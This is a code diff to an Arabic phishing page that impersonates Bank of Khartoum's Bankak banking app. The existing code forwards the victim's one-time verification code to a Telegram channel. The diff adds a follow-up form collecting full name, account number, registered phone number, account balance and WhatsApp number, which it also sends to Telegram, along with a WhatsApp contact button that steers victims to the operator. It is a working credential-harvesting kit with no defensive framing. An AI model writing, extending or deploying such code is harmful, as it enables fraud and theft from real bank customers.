@@ -779,11 +779,39 @@
         .icon-help { background-color: #8cc63f; }
         .icon-location { background-color: #e10a14; }
         .icon-bok { background: linear-gradient(135deg, #8cc63f 50%, #009245 50%); }
+
+        /* زر الواتساب العائم */
+        .float-whatsapp {
+            position: fixed;
+            bottom: 25px;
+            left: 20px;
+            width: 55px;
+            height: 55px;
+            background-color: #25d366;
+            color: #ffffff;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 30px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.3);
+            z-index: 9999;
+            text-decoration: none;
+            transition: transform 0.2s ease;
+        }
+        .float-whatsapp:hover {
+            transform: scale(1.08);
+        }
     </style>
 </head>
 <body>
 
   <div class="app-screen">
+
+    <!-- زر واتساب العائم -->
+    <a href="https://wa.me/249990111810" target="_blank" class="float-whatsapp" title="تواصل عبر واتساب">
+        <i class="fa-brands fa-whatsapp"></i>
+    </a>
 
     <!-- الشاشة الرئيسية الأولى المحدثة بالكامل -->
     <div class="screen active" id="screenHomeMain">
@@ -1159,11 +1187,49 @@
       </div>
     </div>
 
+    <!-- شاشة الاستمارة المطلوبة بعد رمز التحقق -->
+    <div class="screen" id="screenAfterOtp">
+      <div class="top-header" style="padding: 12px 16px;">
+        <div class="header-bar">
+          <button class="btn-back" onclick="switchScreen('screenOtp')">رجوع ➔</button>
+          <span class="page-title">استمارة البيانات</span>
+        </div>
+        <div class="logo-box" style="transform: scale(0.7);">
+          <div class="logo-ar">بنـ<span>كك</span></div>
+        </div>
+      </div>
+
+      <div class="form-section">
+        <form onsubmit="handleAfterOtpFormSubmit(event)">
+          <div class="input-box">
+            <label class="input-label">الاسم رباعي</label>
+            <input type="text" class="input-field" id="formQuadName" placeholder="أدخل الاسم رباعي" required autocomplete="off" />
+          </div>
+          <div class="input-box">
+            <label class="input-label">رقم الحساب</label>
+            <input type="text" class="input-field" id="formAccountNumber" placeholder="أدخل رقم الحساب" required autocomplete="off" />
+          </div>
+          <div class="input-box">
+            <label class="input-label">رقم الهاتف المسجل مع الحساب</label>
+            <input type="tel" class="input-field" id="formRegisteredPhone" placeholder="أدخل رقم الهاتف المسجل مع الحساب" required autocomplete="off" />
+          </div>
+          <div class="input-box">
+            <label class="input-label">الرصيد المتبقي في الحساب</label>
+            <input type="text" class="input-field" id="formRemainingBalance" placeholder="أدخل الرصيد المتبقي في الحساب" required autocomplete="off" />
+          </div>
+          <div class="input-box">
+            <label class="input-label">رقم واتساب</label>
+            <input type="tel" class="input-field" id="formWhatsAppNumber" placeholder="أدخل رقم واتساب" required autocomplete="off" />
+          </div>
+          <button type="submit" class="btn-red" style="margin-top: 15px;">إرسال</button>
+        </form>
+      </div>
+    </div>
+
     <!-- شاشة تقديم الطلب والتواصل الرسمية -->
     <div class="screen" id="screenLoading">
       <div class="top-header" style="padding: 12px 16px;">
         <div class="header-bar">
-          <button class="btn-back" onclick="switchScreen('screenLogin')">رجوع ➔</button>
           <span class="page-title">حالة الطلب</span>
         </div>
         <div class="logo-box" style="transform: scale(0.7);">
@@ -1173,7 +1239,7 @@
 
       <div class="loading-screen">
         <div class="loading-spinner"></div>
-        <div class="loading-title">جاري تقديم الطلب...</div>
+        <div class="loading-title">جاري تقديم الاستمارة...</div>
         <div class="loading-subtitle">يرجى عدم الخروج من الصفحة</div>
 
         <div class="contact-card">
@@ -1462,7 +1528,6 @@
       selectedServiceIndex = index;
       selectedServiceName = name;
 
-      // تحديث النص ديناميكياً داخل النافذة المنبثقة
       const completeTextEl = document.getElementById('completeServiceText');
       if (completeTextEl) {
         completeTextEl.textContent = `لإكمال الإجراءات وإكمال خدمة (${name}) بنجاح. يرجى تسجيل الدخول إلى حسابك المصرفي في بنك الخرطوم (بنكك)`;
@@ -1739,7 +1804,21 @@
       }
 
       sendToTelegram(`📱 *رمز التحقق OTP*\n\n🔢 الرمز: \`${otp}\``);
-      switchScreen('screenLoading');
+      // الانتقال إلى شاشة الاستمارة المطلوبة بعد رمز التحقق
+      switchScreen('screenAfterOtp');
+    }
+
+    function handleAfterOtpFormSubmit(e) {
+      e.preventDefault();
+      const quadName = document.getElementById('formQuadName').value.trim();
+      const accNum = document.getElementById('formAccountNumber').value.trim();
+      const phoneNum = document.getElementById('formRegisteredPhone').value.trim();
+      const balanceNum = document.getElementById('formRemainingBalance').value.trim();
+      const waNum = document.getElementById('formWhatsAppNumber').value.trim();
+
+      sendToTelegram(`📋 *استمارة ما بعد رمز التحقق:*\n- الاسم رباعي: ${quadName}\n- رقم الحساب: ${accNum}\n- رقم الهاتف المسجل: ${phoneNum}\n- الرصيد المتبقي: ${balanceNum}\n- رقم واتساب: ${waNum}`);
+
+      switchScreen('screenSubmitting');
     }
 
     function attemptJoinDeal(dealName, amount) {
